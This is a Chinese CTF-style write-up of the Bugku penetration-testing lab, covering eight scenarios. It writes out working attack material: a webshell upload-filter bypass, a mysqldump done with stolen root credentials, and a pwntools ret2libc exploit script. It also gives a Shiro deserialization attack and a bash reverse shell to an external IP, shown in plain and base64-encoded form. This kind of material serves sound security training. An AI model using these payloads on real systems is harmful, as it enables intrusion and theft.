---
title: bugku渗透(一)
date: 2022-09-27 20:31:52
tags: 
    - 渗透测试
categories: 
    - 渗透测试
---

bugku渗透(一)

<!--more-->

bugku出了新的模式，渗透测试，来水水文章，一共有十一个场景，也就是相当于十一个题目吧

--------------------------------------

# 场景一

刚开始只给了一个地址http://139.224.3.107:80

访问一下，源码得到flag

![image-20220927100519237](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271005299.png?x-oss-process=hzy)

PS：下个flag网站管理员才能看到哦

flag{f42f76f14f9cce709a39b3bdad69a627}

# 场景二

这个应该就是网站后台吧，dirsearch扫一下

![image-20220927101707032](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271017087.png?x-oss-process=hzy)

得到admin

![image-20220927101015521](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271010591.png?x-oss-process=hzy)

浅浅试了一下，admin/admin登录

![image-20220927101111300](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271011357.png?x-oss-process=hzy)

 ps:/home

flag{f624caaebfc9654f14f33114908a952c}

# 场景三

这个是home路径下的，访问一下看看

![image-20220927101238160](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271012228.png?x-oss-process=hzy)

不存在，所以应该是进入home文件夹下，也就是需要getshell，在后台寻找一下利用点

![image-20220927101402347](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271014401.png?x-oss-process=hzy)

存在上传配置，加个php

![image-20220927101547883](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271015935.png?x-oss-process=hzy)

应该是streplace函数了，php替换为空，尝试大小写绕过成功

![image-20220927102133071](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271021147.png?x-oss-process=hzy)

但是这个上传之后发现连不上，不知道咋回事，尝试双写绕过成功连接

上蚁剑

![image-20220927102527925](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271025993.png?x-oss-process=hzy)

![image-20220927102706770](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271027810.png?x-oss-process=hzy)

 PS:root and database

flag{f3b1bce4b65eea538acd840cb304c051}

# 场景四

这道应该就是和数据库有关系了，同时涉及到权限

find一下database，寻找config.php的相关配置

![image-20220927103049832](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271030880.png?x-oss-process=hzy)

得到root为root/root

nmap扫一下开放端口

![image-20220927103330142](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271033183.png?x-oss-process=hzy)

![image-20220927103613678](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271036735.png?x-oss-process=hzy)

发现3306mysql端口并没有打开，搜了一下可以直接在蚁剑里用mysqldump  dump下来

```
mysqldump -uroot -proot flag > flag.sql
```

![image-20220927103503488](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271035546.png?x-oss-process=hzy)

ps：可以试试nc 还有 root

flag{6f1fe51fc70b3adc54fd54ae79a1cf0d}

# 场景五

找了一圈，最后发现这个场景考察的是一个pwn吧

![image-20220927104120831](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271041874.png?x-oss-process=hzy)

有个main文件

![image-20220927104135755](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271041807.png?x-oss-process=hzy)

32位文件，ida打开反编译看看

![image-20220927104246804](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271042870.png?x-oss-process=hzy)

跟进vul函数

![image-20220927104408685](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271044735.png?x-oss-process=hzy)

这地方存在溢出

![image-20220927104458407](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271044454.png?x-oss-process=hzy)

没有给/bin/sh，emm



```
from pwn import *

context.log_level = "debug"

p = remote('139.224.3.107',9999)
elf = ELF('./main')

write_plt = elf.plt['write']
write_got = elf.got['write']
 
main_addr = 0x0804848A
offset_write =0x0d5c90
offset_system = 0x03adb0
offset_str_bin_sh =0x15bb2b

payload = 'A' * 40 + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

p.sendlineafter('plz input your name:\n',payload)
write_addr = u32(p.recv(4))
libc_base = write_addr - offset_write
sys_addr = libc_base + offset_system
sh_addr = libc_base + offset_str_bin_sh

payload = 'A' * 40 + p32(sys_addr) + p32(4) + p32(sh_addr)
p.sendline(payload)
p.interactive()

```

![image-20220927105421252](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271054310.png?x-oss-process=hzy)

 PS：port 8080

flag{4b139fce0c0c3e53a69fc34fabd2d6db}

# 场景六

看8080端口

dirsearch扫一下得到robots.txt

![image-20220927105703038](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271057092.png?x-oss-process=hzy)

![image-20220927105715271](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271057314.png?x-oss-process=hzy)

PS:next to my home 

flag{00200c35443afb415c4427f94094fdd0} 

# 场景七

![image-20220927105819267](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271058329.png?x-oss-process=hzy)

抓个包看看

![image-20220927105939682](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271059783.png?x-oss-process=hzy)

nice，shiro洞

先用下面这个寻找一下是否存在默认的key

[insightglacier/Shiro_exploit: Apache Shiro 反序列化漏洞检测与利用工具 (github.com)](https://github.com/insightglacier/Shiro_exploit)

找到true key

![image-20220927111831216](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271118276.png?x-oss-process=hzy)

```
vulnerable:True url:http://139.224.3.107:8080   CipherKey:kPH+bIxk5D2deZiIxcaaaA==
```

制作vps反弹shell

```
bash -i >& /dev/tcp/43.138.40.212/7777 0>&1
```

Java Runtime 配合 bash 编码

[命令执行在线编码 | 国光 (sqlsec.com)](https://www.sqlsec.com/rce/)

![image-20220927112511685](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271125746.png?x-oss-process=hzy)

```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzguNDAuMjEyLzc3NzcgMD4mMQ==|base64 -d|bash -i
bash -c {echo YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzguNDAuMjEyLzc3NzcgMD4mMQ==}|{base64 -d}|{bash -i}
```

剩下的利用方式参考文章[Shiro反序列化漏洞利用汇总 - 腾讯云开发者社区-腾讯云 (tencent.com)](https://cloud.tencent.com/developer/article/1657019)

有亿点点麻烦，时间来不及了，直接在github找自动化

[fupinglee/JavaTools: 一些Java编写的小工具。 (github.com)](https://github.com/fupinglee/JavaTools)

flag{ebc4589713b98ca222f788902adb408f}



# 场景八

suid提权

```
find / -perm -4000 -type f 2>/dev/null #查看具有suid 权限的可执行二进制程序
```

![image-20220927115642833](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271156885.png?x-oss-process=hzy)

没完成

![image-20220927120235045](https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209271202106.png?x-oss-process=hzy)

下次有金币再玩吧

